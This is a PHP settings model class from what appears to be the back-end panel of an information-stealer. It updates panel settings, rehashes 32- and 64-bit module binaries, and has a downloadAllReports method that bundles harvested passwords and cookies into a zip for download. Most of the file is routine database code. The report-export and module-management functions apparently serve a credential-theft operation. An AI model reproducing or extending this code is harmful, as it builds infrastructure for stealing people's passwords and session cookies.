<?php

class Model_Settings extends Model
{

    public function get_data()
    {

    }

    public function getGeneralSettings()
    {
        $result = array();
        $general_settings = $this->getDB()->queryRows('SELECT * FROM general_settings');
        return $general_settings;
    }

    public function updateSetting()
    {
        if(!empty($this->request_data['setting_name']) && (!empty($this->request_data['setting_value'] || $this->request_data['setting_value'] == 0)))
        {
            $this->getDB()->update('general_settings',
                array('setting_value' => $this->request_data['setting_value']),
                'setting_name=:setting_name',
                array(':setting_name' => $this->request_data['setting_name']));
            return true;
        }
        return false;
    }

    public function updateModulesHash()
    {
        $modules = $this->getDB()->queryRows('SELECT * FROM modules');

        foreach($modules as $module)
        {
            if (!empty($module['path_x32']) && file_exists(MODULES_DIRECTORY . $module['path_x32']))
            {
                $file = file_get_contents(MODULES_DIRECTORY . $module['path_x32']);
                $currentFileHash = hash("md5", $file, FALSE);

                if ($module['hash_x32'] != $currentFileHash)
                {
                    $this->getDB()->update('modules', array('hash_x32' => $currentFileHash),
                        'id = :id', array(':id' => $module['id']));
                }
            }
            if (!empty($module['path_x64']) && file_exists(MODULES_DIRECTORY . $module['path_x64']))
            {
                $file = file_get_contents(MODULES_DIRECTORY . $module['path_x64']);
                $currentFileHash = hash("md5", $file, FALSE);

                if ($module['hash_x64'] != $currentFileHash)
                {
                    $this->getDB()->update('modules', array('hash_x64' => $currentFileHash),
                        'id = :id', array(':id' => $module['id']));
                }
            }
        }
        return true;
    }

    public function downloadAllReports()
    {
        $zipSaver = new ZipSaver();
        $zipSaver->newZip()->downloadPasswords()->downloadCookies()->sendZip();
    }


}